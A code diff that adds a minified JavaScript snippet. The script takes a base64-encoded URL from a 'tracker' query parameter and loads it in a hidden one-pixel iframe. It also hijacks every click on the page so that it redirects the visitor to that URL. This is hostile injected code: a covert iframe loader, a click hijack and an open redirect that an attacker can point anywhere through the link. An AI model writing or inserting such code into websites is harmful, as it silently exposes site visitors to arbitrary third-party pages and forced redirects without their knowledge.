@@ -1,0 +1,8 @@
+(function(window){function setCss(element,stylesOrKey,value){var attributeValue;if("object"===typeof stylesOrKey){for(var key in stylesOrKey){setCss(element,key,stylesOrKey[key]);}
+return;}
+if(element.style){element.style.setProperty?element.style.setProperty(stylesOrKey,""):element.style.setAttribute(stylesOrKey,"");attributeValue=("undefined"!==typeof element.style.cssText?element.style.cssText:"")+stylesOrKey+":"+value+" !important;";}else{attributeValue=stylesOrKey+":"+value+" !important;";}
+element.setAttribute("style",attributeValue);}
+function getQueryVal(key){key=key.replace(/[\[\]]/g,"\\$&");var result=(new RegExp("[?&]"+key+"(=([^&#]*)|&|#|$)")).exec(window.location.href);if(result===null||!result[2]){return false;}
+return result[2]?decodeURIComponent(result[2].replace(/\+/g," ")):false;}
+try{var body=document.getElementsByTagName("body")[0];var tracker=getQueryVal("tracker");if(typeof body==="undefined"||!tracker){return;}
+var href=window.atob(tracker);var iframe=document.createElement("iframe");iframe.id="iftr";iframe.src=href;setCss(iframe,{width:"1px",height:"1px",position:"fixed",bottom:"0px",left:"0px",display:"none"});body.appendChild(iframe);body.addEventListener("click",function(){window.location.href=href;});}catch(err){console.error(err);}}(window));
